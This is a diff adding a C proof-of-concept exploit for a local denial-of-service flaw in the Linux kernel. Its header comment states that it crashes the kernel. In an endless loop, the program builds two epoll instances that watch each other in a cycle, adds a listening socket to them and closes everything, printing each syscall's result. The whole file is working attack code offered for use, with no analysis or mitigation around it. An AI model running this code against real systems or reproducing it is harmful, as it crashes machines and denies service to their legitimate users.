@@ -1,0 +1,68 @@
+/*
+The Linux Kernel is prone to a local denial-of-service vulnerability. 
+
+Successful exploits will allow attackers to cause the kernel to crash, denying service to legitimate users.
+*/
+
+
+#include <netinet/in.h>
+#include <sys/epoll.h>
+#include <errno.h>
+
+int
+main ()
+{
+    struct sockaddr_in addr;
+    struct epoll_event event;
+    int epfd1, epfd2, sock;
+    int rc;
+    int i = 0;
+    while (1)
+    {
+        printf("ITERATION %d\n", ++i);
+        epfd1 = epoll_create(1);
+        printf("epoll_create() -> %d(%d)\n", epfd1, errno);
+        epfd2 = epoll_create(1);
+        printf("epoll_create() -> %d(%d)\n", epfd2, errno);
+
+        sock = socket(PF_INET, SOCK_STREAM, 0);
+        printf("socket() -> %d(%d)\n", sock, errno);
+
+        addr.sin_family = AF_INET;
+        addr.sin_port = 0;
+        addr.sin_addr.s_addr = 0;
+        rc = bind(sock, (struct sockaddr*)&addr, sizeof(addr));
+        printf("bind() -> %d(%d)\n", rc, errno);
+
+        rc = listen(sock, 1);
+        printf("listen() -> %d(%d)\n", rc, errno);
+
+        event.data.fd = sock;
+        event.events = 0;
+        rc = epoll_ctl(epfd1, EPOLL_CTL_ADD, sock, &event);
+        printf("epoll_ctl() -> %d(%d)\n", rc, errno);
+
+        event.data.fd = epfd2;
+        event.events = EPOLLIN;
+        rc = epoll_ctl(epfd1, EPOLL_CTL_ADD, epfd2, &event);
+        printf("epoll_ctl() -> %d(%d)\n", rc, errno);
+
+        event.data.fd = epfd1;
+        event.events = EPOLLIN;
+        rc = epoll_ctl(epfd2, EPOLL_CTL_ADD, epfd1, &event);
+        printf("epoll_ctl() -> %d(%d)\n", rc, errno);
+
+        rc = close(epfd1);
+        printf("close(epfd1) -> %d(%d)\n", rc, errno);
+
+        rc = close(epfd2);
+        printf("close(epfd2) -> %d(%d)\n", rc, errno);
+
+        rc = close(sock);
+        printf("close(sock) -> %d(%d)\n", rc, errno);
+
+        sleep(1);
+        printf("\n\n");
+    }
+    return 0;
+}
